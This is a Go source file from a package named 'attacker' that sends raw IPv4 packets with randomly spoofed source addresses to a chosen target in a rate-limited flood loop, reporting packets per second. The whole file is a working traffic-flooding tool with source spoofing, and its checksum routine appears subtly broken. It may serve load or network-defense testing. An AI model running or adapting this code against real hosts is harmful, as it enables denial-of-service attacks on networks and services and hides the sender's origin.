package attacker

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"syscall"
	"time"

	"go.uber.org/ratelimit"
	"golang.org/x/net/ipv4"
)

func init() {
	rand.Seed(time.Now().Unix())
}

func CheckSum(msg []byte) uint16 {
	sum := 0
	for n := 1; n < len(msg)-1; n += 2 {
		sum += int(msg[n])*256 + int(msg[n+1])
	}
	sum = (sum >> 16) + (sum & 0xffff)
	sum += (sum >> 16)
	var ans = uint16(^sum)
	return ans
}

func SocketAddrOf(ip string, port int) (syscall.SockaddrInet4, error) {
	_ip := strings.Split(ip, ".")
	addr := syscall.SockaddrInet4{
		Port: port,
	}

	for i := 0; i < 4; i++ {
		n, err := strconv.Atoi(_ip[i])
		if err != nil {
			fmt.Fprintf(os.Stderr, "sendPkt: %v\n", err)
			return addr, err
		}
		addr.Addr[i] = byte(n)
	}

	return addr, nil
}

func SendPkt(fd int, dstIP string, rate int, nbPkt int, random bool) {
	ip := net.ParseIP(dstIP)
	if ip == nil {
		fmt.Fprintf(os.Stderr, "sendPkt: parse dst ip error: %s\n", dstIP)
		return
	}

	addr, err := SocketAddrOf(dstIP, 0)
	if err != nil {
		fmt.Fprintf(os.Stderr, "sendPkt: parse dst ip error: %s\n", dstIP)
		return
	}

	var pkts int = 0
	quit := make(chan struct{})

	go func() {
		previous := pkts
		start := time.Now()
		past := time.Now()
		time.Sleep(1000 * time.Millisecond)
		for {
			select {
			case <-quit:
				fmt.Printf("timer quit!\n")
				break
			default:
				_pkts := pkts
				delta := _pkts - previous
				duration := time.Since(past)

				past = time.Now()

				speed := float64(delta) / duration.Seconds()
				fmt.Printf("total pkts: %8d || time: %5.1fs, pkts: %6d, speed: %6.1fpps\n",
					_pkts, time.Since(start).Seconds(), delta, speed)
				previous = _pkts
				time.Sleep(1000 * time.Millisecond)
			}
		}
	}()

	header := ipv4.Header{
		Version:  4,
		Len:      20,
		TotalLen: 20,
		TTL:      64,
		Protocol: 4,
		Checksum: 0,
		Dst:      ip,
		Src:      net.IPv4(10, 0, 0, 5),
	}

	header.Src = net.IPv4(10, byte(rand.Intn(255)), byte(rand.Intn(255)), byte(rand.Intn(254)+1))
	fmt.Printf("target: %+v, ip: %v\n", addr, ip)

	rl := ratelimit.New(rate)
	for true {
		rl.Take()
		if random {
			header.Src = net.IPv4(10, byte(rand.Intn(255)), byte(rand.Intn(255)), byte(rand.Intn(254)+1))
		}
		//header.Src = net.IPv4(192, 168, 200, 130)

		payload, err := header.Marshal()
		if err != nil {
			fmt.Fprintf(os.Stderr, "sendPkt: %v, %v\n", err, payload)
		}

		//fmt.Printf("%s\n", header.String())
		syscall.Sendto(fd, payload, 0, &addr)
		pkts++
		if nbPkt > 0 && pkts >= nbPkt {
			fmt.Printf("pkt sent: %8d/%8d\n", pkts, nbPkt)
			break
		}
	}

	quit <- struct{}{}

}
